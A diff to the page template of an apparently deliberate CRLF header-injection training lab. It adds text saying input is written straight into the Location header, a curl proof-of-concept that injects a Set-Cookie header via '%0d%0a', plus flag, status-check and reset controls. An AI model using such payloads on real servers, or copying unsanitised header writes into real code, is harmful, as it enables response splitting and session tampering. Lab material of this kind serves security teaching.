@@ -10,13 +10,41 @@
 <div class="lab-wrap">
   <div class="lab-card">
     <h1>URL Redirect Service</h1>
-    <p>Enter a destination URL to be redirected.</p>
+    <p>Enter a destination URL. The value is written directly into the <code>Location</code> response header.</p>
     <form method="GET" action="/labs/crlf-header-injection/go">
       <label>Destination URL</label>
       <input name="dest" placeholder="https://example.com" autocomplete="off">
       <button type="submit">Go</button>
     </form>
+    <p class="lab-meta" style="margin-top:0.8rem;">Browsers normalise newlines, so use a raw HTTP client to prove the injection, for example:</p>
+    <pre class="lab-code">curl --path-as-is "http://localhost:3000/labs/crlf-header-injection/go?dest=%0d%0aSet-Cookie:%20crlf=pwned%0d%0a%0d%0a"</pre>
   </div>
 
+  <% if (exploited) { %>
+    <div class="lab-card">
+      <div class="lab-alert success">CRLF sequence accepted in the redirect destination. Flag: <span class="lab-flag"><%= flag %></span></div>
+    </div>
+  <% } %>
+
+  <div class="lab-card">
+    <h2>Verification</h2>
+    <p>After sending a destination containing <code>%0d%0a</code>, check whether the server recorded the injection.</p>
+    <button type="button" class="secondary" id="checkCrlf">Check status</button>
+    <pre class="lab-code" id="crlfResult" style="margin-top:0.8rem;">Not checked yet.</pre>
+  </div>
+
+  <form method="POST" action="/labs/crlf-header-injection/reset"><button type="submit" class="secondary">Reset lab</button></form>
+</div>
+<script>
+  document.getElementById('checkCrlf').addEventListener('click', async function () {
+    const out = document.getElementById('crlfResult');
+    try {
+      const response = await fetch('/labs/crlf-header-injection/status');
+      out.textContent = JSON.stringify(await response.json(), null, 2);
+    } catch (error) {
+      out.textContent = 'Status check failed: ' + error.message;
+    }
+  });
+</script>
 </body>
 </html>
